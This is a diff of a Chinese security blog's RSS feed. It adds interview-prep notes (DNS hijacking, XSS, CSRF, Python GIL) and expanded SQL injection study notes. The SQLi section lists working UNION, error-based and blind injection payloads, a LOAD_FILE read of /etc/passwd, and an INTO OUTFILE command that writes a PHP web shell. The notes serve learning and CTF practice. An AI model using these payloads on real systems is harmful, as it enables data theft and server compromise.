@@ -5,9 +5,87 @@
     <description>欢迎聆听我的碎碎念😯</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 14 Mar 2018 17:26:25 +0800</pubDate>
-    <lastBuildDate>Wed, 14 Mar 2018 17:26:25 +0800</lastBuildDate>
+    <pubDate>Fri, 16 Mar 2018 19:51:43 +0800</pubDate>
+    <lastBuildDate>Fri, 16 Mar 2018 19:51:43 +0800</lastBuildDate>
     <generator>Jekyll v3.4.3</generator>
+    
+      <item>
+        <title>面试问题总结</title>
+        <description>&lt;h3 id=&quot;腾讯-2018-03-16&quot;&gt;腾讯 2018-03-16&lt;/h3&gt;
+&lt;p&gt;听完段博士的中期答辩，回到实验室就接到一面电话，还好没回宿舍睡午觉哪…&lt;/p&gt;
+
+&lt;p&gt;总体来说，我感觉自己对很多问题的理解都太浅了，稍微有点深入我就die了，还是得把每个问题扣细了看哪~&lt;/p&gt;
+
+&lt;p&gt;然后虽然我投的是安全岗，但是一些编程相关的基础知识还是得看的。&lt;/p&gt;
+
+&lt;p&gt;1.学过哪些跟安全相关的课程，印象最深的是什么课程，课程里面印象最深的是什么？&lt;/p&gt;
+
+&lt;p&gt;我答了计算机网络，怕其他课程会踩坑，然后讲了DNS的解析过程，DNS劫持、DNS污染。
+然后问了DNS劫持和污染不都是劫持吗，怎么去劫持？（我可能是答错了，不仔细看原理的后果很严重&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;DNS劫持：&lt;code class=&quot;highlighter-rouge&quot;&gt;劫持了DNS服务器&lt;/code&gt;，通过某些手段取得某域名的解析记录控制权限，进而修改此域名的解析结果，导致对该域名的访问由原IP地址转入到修改后的指定IP。解决:使用国外免费公用的DNS服务器，如8.8.8.8&lt;/li&gt;
+  &lt;li&gt;DNS污染：让一般用户由于得到虚假目标主机IP而不能与其通信的方法，是一种DNS缓存投毒攻击，一旦发现与关键词相匹配的请求则立即伪装成目标域名的解析服务器给查询者返回虚假结果，直接在&lt;code class=&quot;highlighter-rouge&quot;&gt;协议上&lt;/code&gt;对用户的DNS请求进行干扰。解决:使用VPN&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;2.XSS是在&lt;code class=&quot;highlighter-rouge&quot;&gt;前端&lt;/code&gt;执行的，虽然有存储型XSS，但是还是在前端被X啊。会产生哪些影响：cookie劫持、后台增删改文章、钓鱼（利用xss构造出一个登录框，骗取用户账户密码）、xss蠕虫（利用xss漏洞进行传播）、修改网页代码（必须存在存储型xss漏洞，并且将结果返回到页面上）、利用网站重定向、获取用户信息（如浏览器信息，IP地址等）。&lt;/p&gt;
+
+&lt;p&gt;3.CSRF的过程，会读数据吗？CSRF可以读数据，如2007年的Gmail CSRF漏洞，邮箱的Filter中会新创建一条规则，将所有带附件的邮件都转发到攻击者的邮箱中。&lt;/p&gt;
+
+&lt;p&gt;token除了可以放在post包里面，还可以放在那里？用户的Session中，或者浏览器的cookie中。&lt;/p&gt;
+
+&lt;p&gt;4.堡垒机是干什么的？（自己给自己挖的坑吧）
+    运维堡垒主机是种具备强大防御功能和安全审计功能的服务器。基于跳板机理念，作为内外网络的个安全审计监测点，以达到把所有网站安全问题集中到某台服务器上解决，从而省时省力。同时运维堡垒主机还具备了，对运维人员的远程登录进行集中管理的功能作用。&lt;/p&gt;
+
+&lt;p&gt;5.python的多线程、&lt;a href=&quot;http://blog.csdn.net/you_are_my_dream/article/details/56316826&quot;&gt;多进程&lt;/a&gt;,可能我还是需要把我辣鸡的小爬虫做成多线程的看看，回答起来才更有底气啊。&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;背景：
+    &lt;ul&gt;
+      &lt;li&gt;GIL(Global Interpreter Lock):全局解释器锁&lt;/li&gt;
+      &lt;li&gt;每个CPU在同一时间只能执行一个线程&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;多线程执行方式：
+    &lt;ul&gt;
+      &lt;li&gt;获取GIL&lt;/li&gt;
+      &lt;li&gt;执行代码知道sleep或者是python虚拟机将其挂起&lt;/li&gt;
+      &lt;li&gt;释放GIL&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;在Python2.x里，GIL的释放逻辑是当前线程遇见IO操作或者ticks计数达到100，而每次释放GIL锁，线程进行锁竞争、切换线程，会消耗资源&lt;/li&gt;
+  &lt;li&gt;是否多线程无用？
+    &lt;ul&gt;
+      &lt;li&gt;CPU密集型代码（循环、计数等），由于计算工作多，ticks计数很快就会达到阈值，然后触发GIL的释放与再竞争（多个线程来回切换当然是需要消耗资源的），所以python下的多线程对&lt;code class=&quot;highlighter-rouge&quot;&gt;CPU密集型代码并不友好!!!!!!!!&lt;/code&gt;。&lt;/li&gt;
+      &lt;li&gt;IO密集型代码（文件处理、爬虫等），多线程能够有效提升效率(单线程下有IO操作会进行IO等待，造成不必要的时间浪费，而开启多线程能在线程A等待时，自动切换到线程B，可以不浪费CPU的资源，从而能提升程序执行效率)。所以python的多线程对&lt;code class=&quot;highlighter-rouge&quot;&gt;IO密集型代码比较友好&lt;/code&gt;。&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;多核多线程比单核多线程更差，原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低&lt;/li&gt;
+  &lt;li&gt;python下想要充分利用多核CPU，就用多进程,每个进程有各自独立的GIL，互不干扰，这样就可以真正意义上的并行执行，所以在python中，多进程的执行效率优于多线程(仅仅针对多核CPU而言)。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;6.&lt;a href=&quot;http://tech.ifeng.com/a/20180305/44895634_0.shtml&quot;&gt;DrDDoS&lt;/a&gt;为什么能放大5w倍：
+Memcached的key-value功能。前文提到key-value的作用是决定存储容量的大小，正常情况下key-value的值通常不超过几千字节。当Memcached被攻击者利用作为反射器时，key-value的值经过修改可以达到100万字节以上。&lt;/p&gt;
+
+&lt;p&gt;http://www.freebuf.com/vuls/164864.html&lt;/p&gt;
+
+&lt;p&gt;7.C++ 为什么能继承（这个我再想想，可能我是把问题听错了）&lt;/p&gt;
+
+&lt;p&gt;8.windows防御机制，哪个是第一个出现的？ASLR、DEP、GS&lt;/p&gt;
+
+&lt;p&gt;9.Java反序列化，这个我要去具体分析几个poc了，要不然说起来真是没底气啊&lt;/p&gt;
+
+&lt;p&gt;10.平时会看书吗？我说了在看兜哥的《web安全深度学习实战》，问我具体的章节问题，里面的demo我都还没试啊，懒惰如我…&lt;/p&gt;
+
+&lt;p&gt;11.做过渗透测试吗：准备做一些 &lt;a href=&quot;hackthebox.eu&quot;&gt;hackbox&lt;/a&gt;上面的题目弥补无渗透经验的缺陷T.T&lt;/p&gt;
+</description>
+        <pubDate>Fri, 16 Mar 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2018/03/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6/</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/03/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6/</guid>
+        
+        <category>sec</category>
+        
+        
+      </item>
     
       <item>
         <title>Word2Vec以及tf实现</title>
@@ -372,10 +450,21 @@ Output Layer维度跟Input Layer的维度一样，用的是Softmax回归，输�
 &lt;ul&gt;
   &lt;li&gt;在浏览器中输入www  . qq  .com 域名，操作系统会先检查自己本地的hosts文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。&lt;/li&gt;
   &lt;li&gt;如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。&lt;/li&gt;
-  &lt;li&gt;如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP/ip参数中设置的首选DNS服务器，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。&lt;/li&gt;
+  &lt;li&gt;如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP/ip参数中设置的&lt;code class=&quot;highlighter-rouge&quot;&gt;首选DNS服务器&lt;/code&gt;，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。&lt;/li&gt;
   &lt;li&gt;如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。&lt;/li&gt;
   &lt;li&gt;如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询，如果未用转发模式，本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(http://qq.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找http://qq.com域服务器，重复上面的动作，进行查询，直至找到www  . qq  .com主机。&lt;/li&gt;
-  &lt;li&gt;如果用的是转发模式，此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;如果用的是转发模式，此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;DNS在进行&lt;a href=&quot;https://www.cnblogs.com/lca1826/p/6599269.html&quot;&gt;区域传输&lt;/a&gt;的时候用TCP，其他时候用UDP&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.williamlong.info/archives/3356.html&quot;&gt;DNS劫持与污染&lt;/a&gt;：
+    &lt;ul&gt;
+      &lt;li&gt;DNS劫持就是指用户访问一个被标记的地址时，DNS服务器故意将此地址指向一个错误的IP地址的行为。范例，网通、电信、铁通的某些用户有时候会发现自己打算访问一个地址，却被转向了各种推送广告等网站，这就是DNS劫持。&lt;/li&gt;
+      &lt;li&gt;DNS污染，指的是用户访问一个地址，国内的服务器(非DNS)监控到用户访问的已经被标记地址时，服务器伪装成DNS服务器向用户发回错误的地址的行为。范例，访问Youtube、Facebook之类网站等出现的状况。&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h3 id=&quot;https相关&quot;&gt;HTTPS相关&lt;/h3&gt;
@@ -551,17 +640,33 @@ Output Layer维度跟Input Layer的维度一样，用的是Softmax回归，输�
 
 &lt;ul&gt;
   &lt;li&gt;
-    &lt;p&gt;原理：通过把sql命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行的sql命令的目的&lt;/p&gt;
+    &lt;p&gt;原理：数据与代码未分离&lt;/p&gt;
   &lt;/li&gt;
-  &lt;li&gt;常规做法：
+  &lt;li&gt;数据库相关：
     &lt;ul&gt;
-      &lt;li&gt;找出查询语句的方法是在后面加&lt;code class=&quot;highlighter-rouge&quot;&gt;’&lt;/code&gt; 、 &lt;code class=&quot;highlighter-rouge&quot;&gt;“&lt;/code&gt; 、 &lt;code class=&quot;highlighter-rouge&quot;&gt;‘)&lt;/code&gt;  、 &lt;code class=&quot;highlighter-rouge&quot;&gt;“)&lt;/code&gt;,看是否报错，然后用&lt;code class=&quot;highlighter-rouge&quot;&gt;and 1=1&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;and 1=2&lt;/code&gt;判断是否存在注入点，然后根据情况用不同的方法注入&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/category/cheat-sheet/sql-injection&quot;&gt;SQLi备忘录&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;确定显示位，可以先尝试用&lt;code class=&quot;highlighter-rouge&quot;&gt;select 1,2,3,4,5……,n#&lt;/code&gt;来检测，之后的查询最好用&lt;code class=&quot;highlighter-rouge&quot;&gt;select @,@,@#&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;select NULL,NULL,NULL#&lt;/code&gt;，可以保证不会因为数据类型不匹配而测试失败&lt;/li&gt;
-      &lt;li&gt;查询数据库名，&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT group_concat(schema_name) FROM information_schema.schemata&lt;/code&gt;&lt;/li&gt;
-      &lt;li&gt;查询表名，&lt;code class=&quot;highlighter-rouge&quot;&gt;select group_concat(table_name) from information_schema.tables where table_schema=’xxxxx’&lt;/code&gt;&lt;/li&gt;
-      &lt;li&gt;查询列名，&lt;code class=&quot;highlighter-rouge&quot;&gt;Select groupc_concat(column_name) from information_schema.columns where table_name=’xxxxx’&lt;/code&gt;&lt;/li&gt;
-      &lt;li&gt;爆数据，&lt;code class=&quot;highlighter-rouge&quot;&gt;Select group_concat(column_name) from table_name&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;mysql 5.0版本以后提供了information.schema数据库：
+  &lt;img src=&quot;/images/posts/2018/03/web/sql/1.png&quot; height=&quot;200&quot; width=&quot;300&quot; /&gt;&lt;/li&gt;
+      &lt;li&gt;查看该数据库中的表：schemata、tables、columns需要重点关注
+  &lt;img src=&quot;/images/posts/2018/03/web/sql/2.png&quot; height=&quot;800&quot; width=&quot;500&quot; /&gt;
+        &lt;ul&gt;
+          &lt;li&gt;schemata：所有数据库的基本信息，包括数据库名，编码类型，路径等。schema_name列即为数据库名。
+  &lt;img src=&quot;/images/posts/2018/03/web/sql/3.png&quot; height=&quot;150&quot; width=&quot;800&quot; /&gt;&lt;/li&gt;
+          &lt;li&gt;tables: 储存mysql中的表信息，table_schema是库名信息，table_nama是表名（图太大了，不截了）&lt;/li&gt;
+          &lt;li&gt;columns：提供了表中的列信息，columns_name字段对应的字段名&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;系统函数：
+        &lt;ul&gt;
+          &lt;li&gt;user() ：当前使用者的用户名&lt;/li&gt;
+          &lt;li&gt;database()：当前数据库名&lt;/li&gt;
+          &lt;li&gt;version()：数据库版本&lt;/li&gt;
+          &lt;li&gt;datadir：读取数据库的绝对路径&lt;/li&gt;
+          &lt;li&gt;@@vasedir：mysql安装路径&lt;/li&gt;
+          &lt;li&gt;@@version_compile_os：操作系统&lt;/li&gt;
+          &lt;li&gt;concat()：连接一个或者多个字符串&lt;/li&gt;
+          &lt;li&gt;group_concat()：连接一个组的所有字符串，并以逗号分隔每一条数据&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;http://blog.51cto.com/wt7315/1828167&quot;&gt;分类&lt;/a&gt;：
@@ -570,23 +675,55 @@ Output Layer维度跟Input Layer的维度一样，用的是Softmax回归，输�
         &lt;ul&gt;
           &lt;li&gt;UNION:合并两个或多个SELECT语句的结果集，并消去表中重复的行。UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型。&lt;/li&gt;
           &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and 1=2 union select 1,version(),database()&lt;/code&gt;可以爆出当前使用的版本和数据库名&lt;/li&gt;
+          &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and 1=2 union select 1,2,schema_name from information_schema.schemata limit 1,1 %23爆出数据库名，依次使用limit2，1往下爆库名&lt;/code&gt;&lt;/li&gt;
+          &lt;li&gt;
+            &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata %23&lt;/code&gt;&lt;/p&gt;
+          &lt;/li&gt;
+          &lt;li&gt;假设有flag库：
+            &lt;ul&gt;
+              &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where schema_name=’flag’&lt;/code&gt; 爆出flag库下的所有的表，假设其中有flagtable表&lt;/li&gt;
+              &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name =’flagtale’&lt;/code&gt;爆出flagtable下的所有字段，假设有name和password字段&lt;/li&gt;
+              &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and 1=2 union select 1,2,group_concat(name,password) from flag.flagtable&lt;/code&gt; 爆出flag下的flagtable表的name和password的内容&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
         &lt;/ul&gt;
       &lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;http://blog.51cto.com/wt7315/1891458&quot;&gt;基于错误回显&lt;/a&gt;
         &lt;ul&gt;
-          &lt;li&gt;通过sql语句的矛盾性来使数据被回显到页面上
-  &lt;img src=&quot;/images/posts/2018/03/web//报错.png&quot; height=&quot;400&quot; width=&quot;800&quot; /&gt;&lt;/li&gt;
+          &lt;li&gt;用到的函数：
+            &lt;ul&gt;
+              &lt;li&gt;count():统计元祖的个数
+   &lt;img src=&quot;/images/posts/2018/03/web/sql/4.png&quot; height=&quot;100&quot; width=&quot;400&quot; /&gt;&lt;/li&gt;
+              &lt;li&gt;rand():0~1的随机数
+   &lt;img src=&quot;/images/posts/2018/03/web/sql/5.png&quot; height=&quot;100&quot; width=&quot;250&quot; /&gt;&lt;/li&gt;
+              &lt;li&gt;floor():向下取整,select floor(rand()*2);的结果为0或者1
+   &lt;img src=&quot;/images/posts/2018/03/web/sql/6.png&quot; height=&quot;200&quot; width=&quot;250&quot; /&gt;&lt;/li&gt;
+              &lt;li&gt;group_concat():将数据进行拼接
+   &lt;img src=&quot;/images/posts/2018/03/web/sql/7.png&quot; height=&quot;100&quot; width=&quot;400&quot; /&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;整合语句：&lt;code class=&quot;highlighter-rouge&quot;&gt;select count(*),concat(0x3a,0x3a,database(),0x3a,floor(rand()*2))name from information_schema.tables group by name;&lt;/code&gt;
+ &lt;img src=&quot;/images/posts/2018/03/web/sql/8.png&quot; height=&quot;200&quot; width=&quot;800&quot; /&gt;
+            &lt;ul&gt;
+              &lt;li&gt;生成随机数并取整，然后用分号将不同的数据拼接，并取别名name，最后将结果以name进行分组并进行统计，能看到统计出的两个不同的取值，0和1。&lt;/li&gt;
+              &lt;li&gt;多重复几次就会报错
+ &lt;img src=&quot;/images/posts/2018/03/web/sql/9.png&quot; height=&quot;30&quot; width=&quot;800&quot; /&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;公式：&lt;code class=&quot;highlighter-rouge&quot;&gt;username=admin' and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) and '1' = '1&lt;/code&gt;&lt;/li&gt;
         &lt;/ul&gt;
       &lt;/li&gt;
       &lt;li&gt;基于盲注
         &lt;ul&gt;
-          &lt;li&gt;时间盲注: &lt;code class=&quot;highlighter-rouge&quot;&gt;and if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&amp;gt;100,1,sleep(3))%23&lt;/code&gt;&lt;/li&gt;
-          &lt;li&gt;布尔型的盲注: 爆数据库的路径&lt;code class=&quot;highlighter-rouge&quot;&gt;and ascii(substr(@@datadir,1,1)）&amp;gt;69 %23&lt;/code&gt;然后使用二分法一步一步确定&lt;/li&gt;
+          &lt;li&gt;时间盲注:
+            &lt;ul&gt;
+              &lt;li&gt;加入特定的时间函数，通过查看是web页面返回的时间差来判断注入的语句是否正确&lt;/li&gt;
+              &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&amp;gt;100,1,sleep(3))%23&lt;/code&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;布尔型的盲注: &lt;code class=&quot;highlighter-rouge&quot;&gt;and ascii(substr(@@datadir,1,1)）&amp;gt;69 %23&lt;/code&gt;&lt;/li&gt;
         &lt;/ul&gt;
       &lt;/li&gt;
-      &lt;li&gt;基于user-agent&lt;/li&gt;
-      &lt;li&gt;基于referer&lt;/li&gt;
-      &lt;li&gt;基于cookie&lt;/li&gt;
       &lt;li&gt;二次注入:分为语句插入和语句执行&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;http://www.91ri.org/8611.html&quot;&gt;宽字节注入&lt;/a&gt;:  （字符集好方啊，我得专门总结一篇啊😂
         &lt;ul&gt;
@@ -597,7 +734,13 @@ Output Layer维度跟Input Layer的维度一样，用的是Softmax回归，输�
       &lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/85936&quot;&gt;其他&lt;/a&gt;：
         &lt;ul&gt;
           &lt;li&gt;读文件：SELECT LOAD_FILE(‘/etc/passwd’);&lt;/li&gt;
-          &lt;li&gt;写文件：SELECT ‘&lt;? system($_GET['c']); ?&gt;’ INTO OUTFILE ‘/var/www/shell.php’;&lt;/li&gt;
+          &lt;li&gt;写文件：
+            &lt;ul&gt;
+              &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT '&amp;lt;? system($_GET['c']); ?&amp;gt;' INTO OUTFILE/DUMPFILE '/var/www/shell.php';&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;into dumpfile 能导出一个完整能执行的2进制文件,函数不对任何列或行进行终止，也不执行任何转义处理&lt;/li&gt;
+              &lt;li&gt;在UDF提权的场景是需要上传二进制文件等等用dumpfile&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
           &lt;li&gt;带外通道：利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.&lt;/li&gt;
         &lt;/ul&gt;
       &lt;/li&gt;
@@ -1169,172 +1312,6 @@ We want the green numbers to be high and red numbers to be low.
         <guid isPermaLink="true">http://localhost:4000/2017/09/unsigned/</guid>
         
         <category>Sec</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>MFC查询注册表数据</title>
-        <description>&lt;h3 id=&quot;相关注册表数据&quot;&gt;相关注册表数据&lt;/h3&gt;
-
-&lt;p&gt;想要通过查询注册表，收集一些系统信息。&lt;/p&gt;
-
-&lt;p&gt;1.系统版本信息:	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ProductName:Windows 10 Enterprise 2015 LTSB
-
-RegisteredOwner:Snowty
-
-SystemRoot:C:\WINDOWS
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/09/MFCRegData//1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;2.是否为虚拟机：	HKEY_LOCAL_MACHINE/HARDWARE/DESCRIPTION/System/BIOS/&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SystemProductName:VMware Virtual Platform
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/09/MFCRegData//2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;3.电脑位数：	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PROCESSOR_ARCHITECTURE:
-	
-    x86　　→32位操作系统
-	
-    AMD64 →64位操作系统
-	
-    IA64　→64位操作系统（for Itanium-based）
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/09/MFCRegData//3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;4.office版本：	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;office2003:11.0
-office2007:12.0
-office2010:14.0
-office2013:15.0
-office2016:16.0
-office2017:17.0
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;5.国家/时区：	HKEY_CURRENT_USER\Control Panel\International\&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sCountry:中华人民共和国
-
-LocalName:zh-CN
-
-sLanguage:CHS
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/09/MFCRegData//4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;mfc查询注册表信息&quot;&gt;MFC查询注册表信息&lt;/h3&gt;
-
-&lt;p&gt;代码主要参考《精通MFC程序设计》，人民邮电，姚领田，第24章，注册表编程。&lt;/p&gt;
-
-&lt;p&gt;整体来说代码很简单，通俗易懂。但是其间出现了宽字节&lt;code class=&quot;highlighter-rouge&quot;&gt;\0&lt;/code&gt;截断的问题，真心是折腾了好久🙄&lt;/p&gt;
-
-&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;RegGetValue&lt;/code&gt;进行查询，详细用法可以查看&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms724868(v=vs.85).aspx&quot;&gt;MSDN&lt;/a&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;n&quot;&gt;LONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WINAPI&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RegGetValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;HKEY&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;hkey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;_In_opt_&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;LPCTSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpSubKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;_In_opt_&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;LPCTSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;_In_opt_&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;dwFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;_Out_opt_&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;LPDWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdwType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;_Out_opt_&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;pvData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;_Inout_opt_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPDWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcbData&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;以查询ProductName为例，全部工程代码见&lt;a href=&quot;https://github.com/Snowty/MFC_RegData&quot;&gt;Git&lt;/a&gt;。&lt;/p&gt;
-
